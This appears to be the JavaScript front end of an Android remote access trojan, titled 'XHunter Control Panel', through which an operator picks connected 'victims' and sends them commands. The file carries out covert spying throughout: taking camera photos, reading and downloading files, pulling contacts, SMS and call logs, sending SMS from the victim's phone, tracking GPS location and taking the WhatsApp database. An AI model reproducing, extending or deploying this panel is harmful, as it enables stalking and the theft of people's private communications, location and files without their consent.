const socket = io();

let selectedVictimId = null;
let currentImageData = null;
const victimsList = document.getElementById('victims');

// Toast Message Function
function showToast(message, type = 'info') {
    const toast = document.getElementById("toast-message");
    toast.textContent = message;
    
    // Set color based on type
    switch(type) {
        case 'success':
            toast.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
            break;
        case 'error':
            toast.style.background = 'linear-gradient(135deg, #ff4444, #cc0000)';
            break;
        case 'warning':
            toast.style.background = 'linear-gradient(135deg, #ffaa00, #ff8800)';
            break;
        default:
            toast.style.background = 'linear-gradient(135deg, #00b7ff, #0088ff)';
    }
    
    toast.className = "show";
    setTimeout(() => {
        toast.className = toast.className.replace("show", "");
    }, 3000);
}

// Clear output area
function clearOutput(outputAreaId) {
    const outputArea = document.getElementById(outputAreaId);
    if (outputArea) {
        outputArea.innerHTML = '';
    }
}

// Ensure victim is selected
function ensureVictimSelected() {
    if (!selectedVictimId) {
        showToast('⚠️ Please select a victim first!', 'warning');
        return false;
    }
    return true;
}

// Socket Events
socket.on('connect', () => {
    console.log('✅ Connected to server as admin');
    socket.emit('adminJoin');
    showToast('✅ Connected to server', 'success');
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
    showToast('❌ Disconnected from server', 'error');
});

// Handle new victim connection
socket.on('join', (device) => {
    console.log('👤 Victim joined:', device);
    
    // Check if device already in list
    const existingItem = document.getElementById(`victim-${device.id}`);
    if (existingItem) {
        existingItem.querySelector('span').textContent = 
            `${device.model} (${device.id}) - Android ${device.android} - 📱 ${device.sim || 'No SIM'} - 🔋 ${Math.round(device.battery)}%`;
        showToast(`🔄 ${device.model} reconnected`, 'warning');
        return;
    }
    
    const listItem = document.createElement('li');
    listItem.id = `victim-${device.id}`;
    listItem.innerHTML = `
        <span>${device.model} (${device.id}) - Android ${device.android} - 📱 ${device.sim || 'No SIM'} - 🔋 ${Math.round(device.battery)}%</span>
        <button data-id="${device.id}" class="select-victim-btn">Select</button>
    `;
    victimsList.appendChild(listItem);

    listItem.querySelector('.select-victim-btn').addEventListener('click', (e) => {
        const currentSelected = document.querySelector('.selected-victim');
        if (currentSelected) {
            currentSelected.classList.remove('selected-victim');
            currentSelected.querySelector('.select-victim-btn').textContent = 'Select';
        }

        selectedVictimId = e.target.dataset.id;
        e.target.parentElement.classList.add('selected-victim');
        e.target.textContent = '✅ Selected';
        console.log('🎯 Selected victim:', selectedVictimId);
        showToast(`🎯 Selected: ${device.model}`, 'success');
    });
});

socket.on('disconnectClient', (socketId) => {
    console.log('❌ Victim disconnected:', socketId);
    const victimListItem = document.getElementById(`victim-${socketId}`);
    if (victimListItem) {
        victimListItem.remove();
        if (selectedVictimId === socketId) {
            selectedVictimId = null;
            showToast('⚠️ Selected victim disconnected', 'warning');
        }
    }
});

// Error handling
socket.on('error', (data) => {
    console.error('❌ Server error:', data.error);
    showToast(`❌ Error: ${data.error}`, 'error');
});

// ==================== TORCH CONTROL FIX ====================
const torchControlBtn = document.getElementById('torch-control-btn');
const torchControlDialog = document.getElementById('torchControlDialog');
const torchOnBtn = document.getElementById('torch-on-btn');
const torchOffBtn = document.getElementById('torch-off-btn');
const torchVictimName = document.getElementById('torch-victim-name');

// TORCH CONTROL BUTTON CLICK
torchControlBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
    torchVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
    torchControlDialog.style.display = 'flex';
});

// CLOSE DIALOG
torchControlDialog.querySelector('.close-button').addEventListener('click', () => {
    torchControlDialog.style.display = 'none';
});

// CLICK OUTSIDE TO CLOSE
window.addEventListener('click', (event) => {
    if (event.target === torchControlDialog) {
        torchControlDialog.style.display = 'none';
    }
});

// TORCH ON BUTTON - FIXED
torchOnBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    
    const requestData = {
        to: selectedVictimId, 
        action: 'turnOnTorch', 
        data: {} 
    };
    
    console.log('🔦 Sending torch ON:', requestData);
    socket.emit('torchControlRequest', JSON.stringify(requestData));
    showToast('🔦 Sending torch ON command...');
});

// TORCH OFF BUTTON - FIXED
torchOffBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    
    const requestData = {
        to: selectedVictimId, 
        action: 'turnOffTorch', 
        data: {} 
    };
    
    console.log('🔦 Sending torch OFF:', requestData);
    socket.emit('torchControlRequest', JSON.stringify(requestData));
    showToast('🔦 Sending torch OFF command...');
});

// TORCH CONTROL RESPONSE
socket.on('torchControlResult', (data) => {
    console.log('🔦 Torch control result:', data);
    if (data.success) {
        showToast(`✅ ${data.message}`, 'success');
    } else {
        showToast(`❌ ${data.message}`, 'error');
    }
    torchControlDialog.style.display = 'none';
});

// ==================== CAMERA CAPTURE FIX ====================
const cameraCaptureBtn = document.getElementById('camera-capture-btn');
const cameraCaptureDialog = document.getElementById('cameraCaptureDialog');
const frontCameraBtn = document.getElementById('front-camera-btn');
const backCameraBtn = document.getElementById('back-camera-btn');
const cameraVictimName = document.getElementById('camera-victim-name');

const imagePreviewDialog = document.getElementById('imagePreviewDialog');
const capturedImage = document.getElementById('captured-image');
const previewVictimName = document.getElementById('preview-victim-name');
const downloadImageBtn = document.getElementById('download-image-btn');
const closePreviewBtn = document.getElementById('close-preview-btn');

// CAMERA CAPTURE BUTTON CLICK
cameraCaptureBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
    cameraVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
    cameraCaptureDialog.style.display = 'flex';
});

// CLOSE CAMERA DIALOG
cameraCaptureDialog.querySelector('.close-button').addEventListener('click', () => {
    cameraCaptureDialog.style.display = 'none';
});

// CLICK OUTSIDE TO CLOSE
window.addEventListener('click', (event) => {
    if (event.target === cameraCaptureDialog) {
        cameraCaptureDialog.style.display = 'none';
    }
});

// FRONT CAMERA BUTTON - FIXED
frontCameraBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    
    const requestData = {
        to: selectedVictimId, 
        action: 'takePicture', 
        data: { frontCamera: true } 
    };
    
    console.log('📸 Sending front camera request:', requestData);
    socket.emit('cameraCaptureRequest', JSON.stringify(requestData));
    showToast('📸 Taking picture with front camera...');
    cameraCaptureDialog.style.display = 'none';
});

// BACK CAMERA BUTTON - FIXED
backCameraBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    
    const requestData = {
        to: selectedVictimId, 
        action: 'takePicture', 
        data: { frontCamera: false } 
    };
    
    console.log('📸 Sending back camera request:', requestData);
    socket.emit('cameraCaptureRequest', JSON.stringify(requestData));
    showToast('📸 Taking picture with back camera...');
    cameraCaptureDialog.style.display = 'none';
});

// IMAGE PREVIEW DIALOG CLOSE
imagePreviewDialog.querySelector('.close-button').addEventListener('click', () => {
    imagePreviewDialog.style.display = 'none';
    capturedImage.src = '';
    currentImageData = null;
});

// CLOSE PREVIEW BUTTON
closePreviewBtn.addEventListener('click', () => {
    imagePreviewDialog.style.display = 'none';
    capturedImage.src = '';
    currentImageData = null;
});

// CLICK OUTSIDE TO CLOSE PREVIEW
window.addEventListener('click', (event) => {
    if (event.target === imagePreviewDialog) {
        imagePreviewDialog.style.display = 'none';
        capturedImage.src = '';
        currentImageData = null;
    }
});

// CAMERA CAPTURE RESPONSE
socket.on('cameraCaptureResult', (data) => {
    console.log('📸 Camera capture result:', data);
    if (data.success && data.image) {
        const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
        
        // Store image data for download
        currentImageData = data.image;
        
        // Display image (add data URL prefix if needed)
        let imageSrc = data.image;
        if (!imageSrc.startsWith('data:image')) {
            imageSrc = "data:image/jpeg;base64," + data.image;
        }
        capturedImage.src = imageSrc;
        
        imagePreviewDialog.style.display = 'flex';
        showToast('✅ Image captured successfully!', 'success');
    } else {
        showToast(`❌ Camera capture failed: ${data.message || 'Unknown error'}`, 'error');
    }
});

// DOWNLOAD CAPTURED IMAGE
downloadImageBtn.addEventListener('click', () => {
    if (!currentImageData) {
        showToast('❌ No image to download', 'error');
        return;
    }
    
    try {
        let imageData = currentImageData;
        if (!imageData.startsWith('data:image')) {
            imageData = "data:image/jpeg;base64," + imageData;
        }
        
        const link = document.createElement('a');
        link.href = imageData;
        link.download = `captured_image_${selectedVictimId}_${Date.now()}.jpg`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        showToast('✅ Image downloaded successfully!', 'success');
    } catch (error) {
        console.error('Download error:', error);
        showToast('❌ Failed to download image', 'error');
    }
});

// ==================== FILE MANAGEMENT ====================
const getDirBtn = document.getElementById('get-dir-btn');
const dirPathInput = document.getElementById('dir-path-input');
const dirListingOutput = document.getElementById('dir-listing-output');
const downloadFileBtn = document.getElementById('download-file-btn');
const filePathInput = document.getElementById('file-path-input');
const previewImageBtn = document.getElementById('preview-image-btn');
const imagePathInput = document.getElementById('image-path-input');

getDirBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const path = dirPathInput.value.trim() || '/';
    clearOutput('dir-listing-output');
    
    const requestData = {
        to: selectedVictimId, 
        action: 'getDir', 
        data: path 
    };
    
    console.log('📁 Sending directory request:', requestData);
    socket.emit('getDirRequest', JSON.stringify(requestData));
    showToast(`📂 Requesting directory: ${path}`);
});

socket.on('getDir', (data) => {
    console.log('📁 Directory Listing:', data);
    clearOutput('dir-listing-output');
    
    if (Array.isArray(data) && data.length > 0) {
        let html = '<h4>📁 Directory Contents:</h4><ul>';
        
        // Sort: directories first, then files
        const sortedData = data.sort((a, b) => {
            if (a.isDirectory && !b.isDirectory) return -1;
            if (!a.isDirectory && b.isDirectory) return 1;
            return a.name.localeCompare(b.name);
        });
        
        sortedData.forEach(item => {
            const icon = item.isDirectory ? '📁' : item.isImage ? '🖼️' : '📄';
            let sizeInfo = '';
            
            if (item.isDirectory) {
                sizeInfo = `<span class="size">${item.items || 0} items</span>`;
            } else {
                const sizeKB = (item.size / 1024).toFixed(2);
                sizeInfo = `<span class="size">${sizeKB} KB</span>`;
            }
            
            html += `
                <li>
                    ${icon} <strong>${item.name}</strong>
                    <div class="file-info">
                        ${sizeInfo}
                        ${item.isDirectory ? '<span class="type">Directory</span>' : '<span class="type">File</span>'}
                    </div>
                </li>
            `;
        });
        html += '</ul>';
        dirListingOutput.innerHTML = html;
        showToast('✅ Directory listing received', 'success');
    } else {
        dirListingOutput.innerHTML = '<p>📭 Directory is empty or not found.</p>';
        showToast('📭 No files found in directory', 'warning');
    }
});

downloadFileBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const path = filePathInput.value.trim();
    if (!path) {
        showToast('⚠️ Please enter a file path', 'warning');
        return;
    }
    
    const requestData = {
        to: selectedVictimId, 
        action: 'download', 
        data: path 
    };
    
    console.log('⬇️ Sending download request:', requestData);
    socket.emit('downloadRequest', JSON.stringify(requestData));
    showToast(`⬇️ Requesting file: ${path}`);
});

socket.on('download', (data) => {
    console.log('📥 Download received:', data);
    
    if (data.fileData && data.fileName) {
        try {
            // Convert base64 to blob
            const byteCharacters = atob(data.fileData);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            
            // Determine MIME type
            let mimeType = 'application/octet-stream';
            const ext = data.fileName.split('.').pop().toLowerCase();
            const mimeTypes = {
                'jpg': 'image/jpeg',
                'jpeg': 'image/jpeg',
                'png': 'image/png',
                'gif': 'image/gif',
                'pdf': 'application/pdf',
                'txt': 'text/plain',
                'mp3': 'audio/mpeg',
                'mp4': 'video/mp4'
            };
            
            if (mimeTypes[ext]) {
                mimeType = mimeTypes[ext];
            }
            
            const blob = new Blob([byteArray], {type: mimeType});
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = data.fileName;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(url);
            
            showToast(`✅ File "${data.fileName}" downloaded`, 'success');
        } catch (error) {
            console.error('Download error:', error);
            showToast('❌ Failed to process download', 'error');
        }
    } else {
        showToast('❌ No file data received', 'error');
    }
});

previewImageBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const path = imagePathInput.value.trim();
    if (!path) {
        showToast('⚠️ Please enter an image path', 'warning');
        return;
    }
    
    const requestData = {
        to: selectedVictimId, 
        action: 'previewImage', 
        data: path 
    };
    
    console.log('🖼️ Sending image preview request:', requestData);
    socket.emit('previewImageRequest', JSON.stringify(requestData));
    showToast(`🖼️ Requesting image: ${path}`);
});

socket.on('previewImage', (data) => {
    console.log('🖼️ Image preview received:', data);
    
    if (data && data.image) {
        const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown Device';
        
        currentImageData = data.image;
        let imageSrc = data.image;
        if (!imageSrc.startsWith('data:image')) {
            imageSrc = "data:image/jpeg;base64," + data.image;
        }
        capturedImage.src = imageSrc;
        
        imagePreviewDialog.style.display = 'flex';
        showToast('✅ Image preview loaded', 'success');
    } else {
        showToast('❌ Failed to load image preview', 'error');
    }
});

// ==================== APP INFORMATION ====================
const getInstalledAppsBtn = document.getElementById('get-installed-apps-btn');
const installedAppsOutput = document.getElementById('installed-apps-output');

getInstalledAppsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('installed-apps-output');
    
    const requestData = {
        to: selectedVictimId, 
        action: 'getInstalledApps', 
        data: {} 
    };
    
    console.log('📱 Sending installed apps request:', requestData);
    socket.emit('getInstalledAppsRequest', JSON.stringify(requestData));
    showToast('📱 Requesting installed apps...');
});

socket.on('getInstalledApps', (data) => {
    console.log('📱 Installed Apps:', data);
    clearOutput('installed-apps-output');
    
    if (data && data.installedApps && data.installedApps.length > 0) {
        let html = '<h4>📱 Installed Applications:</h4><ul>';
        
        data.installedApps.forEach(app => {
            html += `
                <li>
                    <strong>${app.appName}</strong>
                    <div class="app-info">
                        <span class="package">${app.packageName}</span>
                    </div>
                </li>
            `;
        });
        html += '</ul>';
        installedAppsOutput.innerHTML = html;
        showToast(`✅ Found ${data.installedApps.length} apps`, 'success');
    } else {
        installedAppsOutput.innerHTML = '<p>📭 No installed applications found.</p>';
        showToast('📭 No apps found', 'warning');
    }
});

// ==================== CONTACTS, SMS & CALLS ====================
const getContactsBtn = document.getElementById('get-contacts-btn');
const contactsOutput = document.getElementById('contacts-output');
const getSmsBtn = document.getElementById('get-sms-btn');
const smsOutput = document.getElementById('sms-output');
const getCallLogBtn = document.getElementById('get-call-log-btn');
const callLogOutput = document.getElementById('call-log-output');
const sendSmsBtn = document.getElementById('send-sms-btn');
const smsNumberInput = document.getElementById('sms-number-input');
const smsMessageInput = document.getElementById('sms-message-input');

getContactsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('contacts-output');
    
    const requestData = {
        to: selectedVictimId, 
        action: 'getContacts', 
        data: {} 
    };
    
    console.log('👥 Sending contacts request:', requestData);
    socket.emit('getContactsRequest', JSON.stringify(requestData));
    showToast('👥 Requesting contacts...');
});

socket.on('getContacts', (data) => {
    console.log('👥 Contacts:', data);
    clearOutput('contacts-output');
    
    if (data && data.contactsList && data.contactsList.length > 0) {
        let html = `<h4>👥 Contacts (${data.contactsList.length}):</h4><ul>`;
        
        data.contactsList.forEach(contact => {
            const name = contact.name || 'Unknown';
            const phone = contact.phoneNo || 'No number';
            html += `
                <li>
                    <strong>${name}</strong>
                    <div class="contact-info">
                        <span class="phone">${phone}</span>
                    </div>
                </li>
            `;
        });
        html += '</ul>';
        contactsOutput.innerHTML = html;
        showToast(`✅ Found ${data.contactsList.length} contacts`, 'success');
    } else {
        contactsOutput.innerHTML = '<p>📭 No contacts found.</p>';
        showToast('📭 No contacts found', 'warning');
    }
});

getSmsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('sms-output');
    
    const requestData = {
        to: selectedVictimId, 
        action: 'getSMS', 
        data: { start: 0, end: 100 } 
    };
    
    console.log('💬 Sending SMS request:', requestData);
    socket.emit('getSMSRequest', JSON.stringify(requestData));
    showToast('💬 Requesting SMS messages...');
});

socket.on('getSMS', (data) => {
    console.log('💬 SMS Messages:', data);
    clearOutput('sms-output');
    
    if (data && data.sms && data.sms.length > 0) {
        let html = `<h4>💬 SMS Messages (${data.totalSMS} total):</h4><ul>`;
        
        data.sms.forEach(msg => {
            const date = new Date(msg.date);
            const formattedDate = date.toLocaleString();
            const shortBody = msg.body.length > 100 ? msg.body.substring(0, 100) + '...' : msg.body;
            
            html += `
                <li>
                    <div class="sms-header">
                        <strong>${msg.number || 'Unknown'}</strong>
                        <span class="sms-date">${formattedDate}</span>
                    </div>
                    <div class="sms-body">${shortBody}</div>
                </li>
            `;
        });
        html += '</ul>';
        smsOutput.innerHTML = html;
        showToast(`✅ Found ${data.sms.length} SMS messages`, 'success');
    } else {
        smsOutput.innerHTML = '<p>📭 No SMS messages found.</p>';
        showToast('📭 No SMS found', 'warning');
    }
});

getCallLogBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('call-log-output');
    
    const requestData = {
        to: selectedVictimId, 
        action: 'getCallLog', 
        data: {} 
    };
    
    console.log('📞 Sending call log request:', requestData);
    socket.emit('getCallLogRequest', JSON.stringify(requestData));
    showToast('📞 Requesting call log...');
});

socket.on('getCallLog', (data) => {
    console.log('📞 Call Log:', data);
    clearOutput('call-log-output');
    
    if (data && data.callsLog && data.callsLog.length > 0) {
        let html = `<h4>📞 Recent Calls (${data.callsLog.length}):</h4><ul>`;
        
        data.callsLog.forEach(call => {
            let type = '';
            let typeIcon = '';
            let typeClass = '';
            
            switch(call.type) {
                case 1:
                    type = 'Incoming';
                    typeIcon = '📥';
                    typeClass = 'incoming';
                    break;
                case 2:
                    type = 'Outgoing';
                    typeIcon = '📤';
                    typeClass = 'outgoing';
                    break;
                case 3:
                    type = 'Missed';
                    typeIcon = '❌';
                    typeClass = 'missed';
                    break;
                default:
                    type = 'Unknown';
                    typeIcon = '❓';
                    typeClass = 'unknown';
            }
            
            const name = call.name || call.phoneNo || 'Unknown';
            const duration = call.duration ? `${call.duration}s` : 'N/A';
            
            html += `
                <li class="call-type-${typeClass}">
                    <div class="call-header">
                        <strong>${typeIcon} ${name}</strong>
                        <span class="call-duration">${duration}</span>
                    </div>
                    <div class="call-info">
                        <span class="call-type">${type}</span>
                        <span class="call-number">${call.phoneNo || 'N/A'}</span>
                    </div>
                </li>
            `;
        });
        html += '</ul>';
        callLogOutput.innerHTML = html;
        showToast(`✅ Found ${data.callsLog.length} call records`, 'success');
    } else {
        callLogOutput.innerHTML = '<p>📭 No call log entries found.</p>';
        showToast('📭 No call log found', 'warning');
    }
});

sendSmsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    
    const number = smsNumberInput.value.trim();
    const message = smsMessageInput.value.trim();
    
    if (!number) {
        showToast('⚠️ Please enter phone number', 'warning');
        return;
    }
    if (!message) {
        showToast('⚠️ Please enter message', 'warning');
        return;
    }
    
    const requestData = {
        to: selectedVictimId, 
        action: 'sendSMS', 
        data: { mobile_no: number, msg: message } 
    };
    
    console.log('📤 Sending SMS request:', requestData);
    socket.emit('sendSMSRequest', JSON.stringify(requestData));
    
    showToast(`📤 Sending SMS to ${number}...`);
    smsNumberInput.value = '';
    smsMessageInput.value = '';
});

socket.on('sendSMS', (data) => {
    console.log('📤 Send SMS Result:', data);
    
    if (data === "success") {
        showToast('✅ SMS sent successfully!', 'success');
    } else if (data && data.error) {
        showToast(`❌ SMS failed: ${data.error}`, 'error');
    } else {
        showToast('⚠️ SMS operation completed', 'warning');
    }
});

// ==================== LOCATION ====================
const getLocationBtn = document.getElementById('get-location-btn');
const locationOutput = document.getElementById('location-output');

getLocationBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('location-output');
    
    const requestData = {
        to: selectedVictimId, 
        action: 'getLocation', 
        data: {} 
    };
    
    console.log('📍 Sending location request:', requestData);
    socket.emit('getLocationRequest', JSON.stringify(requestData));
    showToast('📍 Requesting location...');
});

socket.on('getLocation', (data) => {
    console.log('📍 Location:', data);
    clearOutput('location-output');
    
    if (data && data.lat && data.long) {
        const lat = parseFloat(data.lat).toFixed(6);
        const lng = parseFloat(data.long).toFixed(6);
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
        const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lng}`;
        
        let html = `
            <h4>📍 Device Location</h4>
            <div class="location-coords">
                <p><strong>Latitude:</strong> ${lat}</p>
                <p><strong>Longitude:</strong> ${lng}</p>
            </div>
            <div class="location-links">
                <a href="${mapsUrl}" target="_blank" class="map-link">🗺️ Open in Google Maps</a>
                <a href="${streetViewUrl}" target="_blank" class="street-link">👁️ Street View</a>
            </div>
            <div class="map-embed">
                <iframe 
                    width="100%" 
                    height="250" 
                    frameborder="0" 
                    style="border:0; border-radius: 10px; margin-top: 15px;"
                    src="https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed"
                    allowfullscreen>
                </iframe>
            </div>
        `;
        
        locationOutput.innerHTML = html;
        showToast('📍 Location received', 'success');
    } else {
        locationOutput.innerHTML = `
            <p>❌ Could not retrieve location.</p>
            <p>Possible reasons:</p>
            <ul>
                <li>Location services are disabled</li>
                <li>No GPS signal</li>
                <li>Location permission not granted</li>
            </ul>
        `;
        showToast('❌ Location not available', 'error');
    }
});

// ==================== WHATSAPP DATABASE ====================
const downloadWhatsappDbBtn = document.getElementById('download-whatsapp-db-btn');

downloadWhatsappDbBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    
    const requestData = {
        to: selectedVictimId, 
        action: 'downloadWhatsappDatabase', 
        data: {} 
    };
    
    console.log('💬 Sending WhatsApp DB request:', requestData);
    socket.emit('downloadWhatsappDatabaseRequest', JSON.stringify(requestData));
    showToast('💬 Requesting WhatsApp database...');
});

socket.on('downloadWhatsappDatabase', (data) => {
    console.log('💬 WhatsApp Database:', data);
    
    if (data.fileData && data.fileName) {
        try {
            const byteCharacters = atob(data.fileData);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            
            const blob = new Blob([byteArray], {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = data.fileName || 'whatsapp_database.db';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(url);
            
            showToast('✅ WhatsApp database downloaded', 'success');
        } catch (error) {
            console.error('WhatsApp DB error:', error);
            showToast('❌ Failed to download WhatsApp DB', 'error');
        }
    } else {
        showToast('❌ No WhatsApp database found', 'error');
    }
});

// ==================== ADDITIONAL STYLES ====================
const style = document.createElement('style');
style.textContent = `
    .file-info, .app-info, .contact-info, .sms-header, .call-header, .call-info {
        display: flex;
        justify-content: space-between;
        margin-top: 5px;
        font-size: 0.9em;
        color: #aaa;
    }
    
    .size, .package, .phone, .sms-date, .call-duration {
        font-family: monospace;
    }
    
    .type {
        background: rgba(0, 183, 255, 0.2);
        padding: 2px 8px;
        border-radius: 4px;
        font-size: 0.8em;
    }
    
    .sms-body {
        margin-top: 5px;
        color: #ddd;
        line-height: 1.4;
    }
    
    .call-type-incoming {
        border-left: 4px solid #00ff88;
    }
    
    .call-type-outgoing {
        border-left: 4px solid #00b7ff;
    }
    
    .call-type-missed {
        border-left: 4px solid #ff4444;
    }
    
    .call-type-unknown {
        border-left: 4px solid #ffaa00;
    }
    
    .call-type, .call-number {
        font-size: 0.9em;
        color: #aaa;
    }
    
    .location-coords {
        background: rgba(0, 183, 255, 0.1);
        padding: 15px;
        border-radius: 10px;
        margin: 15px 0;
    }
    
    .location-links {
        display: flex;
        gap: 15px;
        margin: 15px 0;
    }
    
    .map-link, .street-link {
        background: linear-gradient(135deg, #00b7ff, #0088ff);
        color: white;
        padding: 10px 20px;
        border-radius: 8px;
        text-decoration: none;
        font-weight: 600;
        transition: all 0.3s ease;
    }
    
    .map-link:hover, .street-link:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(0, 183, 255, 0.4);
    }
    
    .street-link {
        background: linear-gradient(135deg, #ff8800, #ff5500);
    }
    
    /* Debug console */
    .debug-console {
        position: fixed;
        bottom: 10px;
        right: 10px;
        width: 300px;
        height: 200px;
        background: rgba(0, 0, 0, 0.8);
        color: #00ff88;
        font-family: monospace;
        font-size: 12px;
        padding: 10px;
        border-radius: 5px;
        overflow-y: auto;
        display: none;
        z-index: 9999;
    }
    
    .debug-console.show {
        display: block;
    }
    
    .debug-toggle {
        position: fixed;
        bottom: 220px;
        right: 10px;
        background: #333;
        color: white;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        z-index: 10000;
    }
`;
document.head.appendChild(style);

// Handle window close
window.addEventListener('beforeunload', () => {
    socket.disconnect();
});

// Auto scroll to bottom for outputs
function autoScroll(elementId) {
    const element = document.getElementById(elementId);
    if (element) {
        element.scrollTop = element.scrollHeight;
    }
}

// Debug toggle
const debugToggle = document.createElement('div');
debugToggle.className = 'debug-toggle';
debugToggle.textContent = '🔧 Debug';
debugToggle.onclick = () => {
    const debugConsole = document.querySelector('.debug-console');
    if (debugConsole) {
        debugConsole.classList.toggle('show');
    }
};
document.body.appendChild(debugToggle);

const debugConsole = document.createElement('div');
debugConsole.className = 'debug-console';
debugConsole.innerHTML = '<h4>Debug Console</h4>';
document.body.appendChild(debugConsole);

function debugLog(message) {
    const debugConsole = document.querySelector('.debug-console');
    if (debugConsole) {
        const p = document.createElement('p');
        p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        debugConsole.appendChild(p);
        debugConsole.scrollTop = debugConsole.scrollHeight;
    }
}

// Initialize
console.log('🎮 XHunter Control Panel loaded');
debugLog('Panel initialized');

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    // Ctrl+D for debug console
    if (e.ctrlKey && e.key === 'd') {
        e.preventDefault();
        const debugConsole = document.querySelector('.debug-console');
        if (debugConsole) {
            debugConsole.classList.toggle('show');
        }
    }
    
    // Ctrl+R to refresh victims
    if (e.ctrlKey && e.key === 'r') {
        e.preventDefault();
        if (selectedVictimId) {
            const selectedBtn = document.querySelector(`#victim-${selectedVictimId} .select-victim-btn`);
            if (selectedBtn) {
                selectedBtn.click();
            }
        }
    }
});

// Periodic connection check
setInterval(() => {
    if (socket.connected) {
        socket.emit('ping', { timestamp: Date.now() });
    }
}, 30000);

socket.on('pong', (data) => {
    debugLog(`Pong received: ${new Date(data.timestamp).toLocaleTimeString()}`);
});
